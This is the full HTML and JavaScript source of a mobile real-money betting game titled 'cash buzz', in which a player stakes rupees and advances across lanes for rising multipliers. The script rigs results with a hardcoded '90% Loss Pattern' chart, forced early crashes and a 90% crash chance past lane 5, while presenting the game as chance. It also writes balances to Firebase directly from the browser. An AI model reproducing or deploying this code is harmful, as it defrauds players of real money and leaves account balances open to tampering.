<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>cash buzz</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        :root {
            --road-grey: #1e293b;
            --grass-green: #064e3b;
            --accent-gold: #fbbf24;
            --premium-gradient: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
            --loss-gradient: linear-gradient(135deg, #ef4444 0%, #991b1b 100%);
        }
        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body { 
            margin: 0; 
            background: #020617; 
            color: white; 
            min-height: 100vh;
            display: flex; 
            justify-content: center;
            overflow-y: auto; 
            -webkit-overflow-scrolling: touch;
        }

        .game-container { 
            width: 100%; 
            max-width: 500px; 
            min-height: 100vh;
            position: relative; 
            display: flex; 
            flex-direction: column; 
            background: #020617;
        }

        .header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 15px 20px; 
            background: rgba(15, 23, 42, 0.9); 
            backdrop-filter: blur(10px); 
            border-bottom: 1px solid rgba(255,255,255,0.1); 
            z-index: 100;
            position: sticky; 
            top: 0;
        }

        .back-btn { 
            width: 40px; 
            height: 40px; 
            background: rgba(255, 255, 255, 0.05); 
            border: 1px solid rgba(255, 255, 255, 0.15); 
            color: white; 
            border-radius: 12px; 
            text-decoration: none; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }

        .balance-card { 
            background: rgba(255, 255, 255, 0.05); 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            padding: 8px 15px; 
            border-radius: 12px; 
            display: flex; 
            align-items: center; 
            gap: 8px; 
        }

        .viewport { 
            height: 450px; 
            position: relative; 
            overflow: hidden; 
            background: #052e16; 
            flex-shrink: 0;
        }

        #gameWorld { position: absolute; left: 0; top: 0; height: 100%; display: flex; transition: transform 0.5s cubic-bezier(0.25, 1, 0.5, 1); }
        .start-zone { width: 100px; background: #064e3b; flex-shrink: 0; position: relative; }
        .lane { width: 160px; height: 100%; background: #1e293b; position: relative; border-right: 4px solid rgba(255,255,255,0.05); flex-shrink: 0; display: flex; flex-direction: column; align-items: center; }
        .multiplier-node { margin-top: auto; margin-bottom: 120px; background: rgba(0,0,0,0.8); border: 2px solid var(--accent-gold); padding: 10px 18px; border-radius: 25px; font-weight: 900; color: var(--accent-gold); font-size: 18px; z-index: 10; }
        .barrier { position: absolute; width: 80px; height: 80px; left: 50%; top: 20%; transform: translateX(-50%); font-size: 60px; display: none; z-index: 40; filter: drop-shadow(0 5px 5px rgba(0,0,0,0.5)); text-align: center; }
        .player-img { position: absolute; width: 90px; height: 90px; z-index: 50; transition: left 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), transform 0.3s; top: 40%; transform: translateY(-50%); }
        .car { position: absolute; width: 70px; height: 140px; z-index: 60; object-fit: contain; top: -200px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.5)); }
        
        .premium-controls { 
            background: #0f172a; 
            padding: 25px 20px calc(30px + env(safe-area-inset-bottom)); 
            border-radius: 30px 30px 0 0; 
            border-top: 1px solid rgba(255,255,255,0.1); 
            display: flex; 
            flex-direction: column; 
            gap: 15px; 
            z-index: 110;
            margin-top: -20px;
        }

        .bet-input-wrapper { display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.05); padding: 8px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1); }
        .circle-btn { width: 50px; height: 50px; border-radius: 12px; border: none; background: var(--premium-gradient); color: white; font-size: 24px; cursor: pointer; }
        #betInput { background: transparent; border: none; color: white; text-align: center; font-size: 24px; font-weight: 800; width: 100px; outline: none; }
        .main-btn { height: 60px; border-radius: 15px; border: none; font-weight: 900; font-size: 18px; color: white; cursor: pointer; text-transform: uppercase; }
        .start-btn { background: var(--premium-gradient); box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3); }
        .cash-btn { background: #10b981; display: none; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
        
        .arrow-trigger { position: absolute; bottom: 180px; right: 25px; z-index: 150; width: 65px; height: 65px; border-radius: 50%; border: none; background: var(--premium-gradient); color: white; font-size: 30px; display: none; cursor: pointer; animation: pulse 1.5s infinite; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 1000; }
        .status-card { width: 85%; max-width: 300px; padding: 40px 20px; border-radius: 25px; text-align: center; animation: pop 0.4s forwards; }
        .win-bg { background: var(--premium-gradient); }
        .loss-bg { background: var(--loss-gradient); border: 2px solid #ef4444; }
        #customAlert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #ef4444; color: white; padding: 12px 25px; border-radius: 10px; font-weight: bold; z-index: 2000; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

<div id="customAlert">Low Balance!</div>

<div class="game-container">
    <div class="header">
        <a href="lobby.html" class="back-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="24" height="24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></a>
        <div class="user-info"><div style="font-size: 10px; opacity: 0.6;">ID: <span id="userUid">51630</span></div></div>
        <div class="balance-card"><span style="color:var(--accent-gold);">₹</span><span id="userBalance">0.00</span></div>
    </div>

    <div class="viewport">
        <div id="gameWorld"><div class="start-zone"></div><img src="image7.png" class="player-img" id="player" style="left: 20px;"></div>
        <button class="arrow-trigger" id="moveBtn" onclick="moveNext()">→</button>
    </div>

    <div class="premium-controls">
        <div class="bet-input-wrapper">
            <button class="circle-btn" onclick="adjustBet(-10)">-</button>
            <input type="number" id="betInput" value="10" inputmode="numeric" onchange="validateInput()">
            <button class="circle-btn" onclick="adjustBet(10)">+</button>
        </div>
        <button id="startBtn" class="main-btn start-btn" onclick="startGame()">Start Adventure</button>
        <button id="cashBtn" class="main-btn cash-btn" onclick="cashOut()">Cash Out</button>
        <div style="height: 20px;"></div>
    </div>

    <div class="overlay" id="statusOverlay">
        <div id="statusCard" class="status-card">
            <h1 id="statusTitle">WIN!</h1>
            <div id="statusAmount" style="font-size: 32px; font-weight: 900; margin: 15px 0;">₹0.00</div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAFeBWLykjlE25vzKFRRJjAw6f1gylplLI",
        authDomain: "admin222-a87bb.firebaseapp.com",
        databaseURL: "https://admin222-a87bb-default-rtdb.firebaseio.com",
        projectId: "admin222-a87bb",
        appId: "1:125393999260:web:cb36cbaa8bfac5cf0be459"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const userPhone = localStorage.getItem('user_phone') || "default";
    let balance = 0;
    let gameActive = false;
    let currentLane = 0;
    let currentPatternIndex = 0;
    let crashPoint = 0;

    // Hardcoded 90% Loss Pattern (S: Success/W, L: Loss/Crash)
    const winLossChart = ['L', 'L', 'L', 'W', 'L', 'L', 'L', 'L', 'L', 'W']; 
    const multipliers = [1.2, 1.6, 2.1, 2.9, 3.8, 5.2, 7.5, 10, 15, 25];
    const LANE_WIDTH = 160; 
    const START_OFFSET = 100;

    db.ref('users/' + userPhone).on('value', (snap) => {
        const data = snap.val();
        if(data) {
            balance = parseFloat(data.balance);
            document.getElementById('userBalance').innerText = balance.toFixed(2);
            document.getElementById('userUid').innerText = data.uid || "51630";
            
            if(balance >= 200 && !gameActive) { 
                window.location.href = "lobby.html"; 
            }
        }
    });

    function initLanes() {
        const world = document.getElementById('gameWorld');
        world.querySelectorAll('.lane').forEach(l => l.remove());
        multipliers.forEach((m, i) => {
            const lane = document.createElement('div');
            lane.className = 'lane';
            lane.id = `lane-${i+1}`;
            lane.innerHTML = `<div class="barrier" id="barrier-${i+1}">🚧</div><div class="multiplier-node">${m}x</div>`;
            world.appendChild(lane);
        });
    }

    function adjustBet(amt) {
        if(gameActive) return;
        let val = parseInt(document.getElementById('betInput').value) + amt;
        if(val < 10) val = 10;
        document.getElementById('betInput').value = val;
    }

    function validateInput() {
        let input = document.getElementById('betInput');
        if(parseInt(input.value) < 10 || isNaN(input.value)) input.value = 10;
    }

    function startGame() {
        const bet = parseInt(document.getElementById('betInput').value);
        if(balance < bet) return showAlert("Low Balance!");

        db.ref('users/' + userPhone).update({ balance: (balance - bet).toFixed(2) });

        gameActive = true;
        currentLane = 0;

        // Force Loss Logic
        let mode = winLossChart[currentPatternIndex];
        if(mode === 'L') {
            // Agar loss mode hai toh 1st, 2nd ya 3rd lane pe hi car thuk jayegi
            crashPoint = Math.floor(Math.random() * 3) + 1; 
        } else {
            crashPoint = 0; // Win mode
        }

        currentPatternIndex = (currentPatternIndex + 1) % winLossChart.length;
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('cashBtn').style.display = 'block';
        document.getElementById('moveBtn').style.display = 'block';
        document.getElementById('betInput').disabled = true;
        document.getElementById('player').src = "image7.png";
        document.getElementById('gameWorld').style.transform = "translateX(0px)";
        initLanes();
    }

    function moveNext() {
        if(!gameActive) return;
        currentLane++;

        const player = document.getElementById('player');
        const world = document.getElementById('gameWorld');
        const targetX = START_OFFSET + (currentLane * LANE_WIDTH) - (LANE_WIDTH / 2) - 45;

        player.style.left = targetX + "px";
        if(currentLane >= 1) { world.style.transform = `translateX(-${(currentLane - 1) * LANE_WIDTH}px)`; }

        let betValue = parseInt(document.getElementById('betInput').value);
        let currentWin = betValue * multipliers[currentLane - 1];

        let isCrashed = false;
        
        // Final Security Check
        if(crashPoint !== 0 && currentLane >= crashPoint) {
            isCrashed = true;
        } else if (currentLane > 5) {
            // Agar galti se upar nikal gaya toh 90% chance crash ka
            if(Math.random() < 0.9) isCrashed = true;
        }

        if(isCrashed) {
            triggerCrash(targetX);
        } else {
            const barrier = document.getElementById(`barrier-${currentLane}`);
            if(barrier) barrier.style.display = 'block';
            document.getElementById('cashBtn').innerText = `CASH OUT ₹${currentWin.toFixed(2)}`;
            
            if((balance + currentWin) >= 200) {
                setTimeout(() => cashOut(), 600);
            }
        }
    }

    function triggerCrash(xPos) {
        gameActive = false;
        document.getElementById('moveBtn').style.display = 'none';
        const world = document.getElementById('gameWorld');
        const car = document.createElement('img');
        car.src = "https://cdn-icons-png.flaticon.com/512/741/741407.png";
        car.className = "car";
        car.style.left = (xPos + 10) + "px";
        world.appendChild(car);

        setTimeout(() => {
            car.style.transition = "top 0.4s ease-in";
            car.style.top = "40%"; 
            setTimeout(() => {
                document.getElementById('player').src = "image8.png";
                setTimeout(() => {
                    showStatus("GAME OVER", "BET LOST", false, false);
                    car.remove();
                }, 600);
            }, 350);
        }, 100);
    }

    function cashOut() {
        if(!gameActive || currentLane === 0) return;
        gameActive = false; 

        const bet = parseInt(document.getElementById('betInput').value);
        const win = bet * multipliers[currentLane - 1];
        const finalCheck = balance + win;

        db.ref('users/' + userPhone).update({ balance: finalCheck.toFixed(2) }).then(() => {
            showStatus("BIG WIN!", "₹" + win.toFixed(2), true, (finalCheck >= 200));
        });
    }

    function showStatus(title, amt, isWin, shouldRedirect) {
        const overlay = document.getElementById('statusOverlay');
        document.getElementById('statusTitle').innerText = title;
        document.getElementById('statusAmount').innerText = amt;
        document.getElementById('statusCard').className = isWin ? 'status-card win-bg' : 'status-card loss-bg';
        overlay.style.display = 'flex';

        setTimeout(() => {
            overlay.style.display = 'none';
            if(shouldRedirect) {
                window.location.href = "lobby.html";
            } else {
                resetGame();
            }
        }, 2000);
    }

    function resetGame() {
        gameActive = false;
        document.getElementById('startBtn').style.display = 'block';
        document.getElementById('cashBtn').style.display = 'none';
        document.getElementById('moveBtn').style.display = 'none';
        document.getElementById('betInput').disabled = false;
        document.getElementById('cashBtn').innerText = "CASH OUT";
        const player = document.getElementById('player');
        player.src = "image7.png";
        player.style.left = "20px";
        document.getElementById('gameWorld').style.transform = "translateX(0px)";
        currentLane = 0;
        initLanes();
    }

    function showAlert(msg) {
        const alrt = document.getElementById('customAlert');
        alrt.innerText = msg;
        alrt.style.display = 'block';
        setTimeout(() => alrt.style.display = 'none', 2000);
    }

    initLanes();
</script>
</body>
</html>
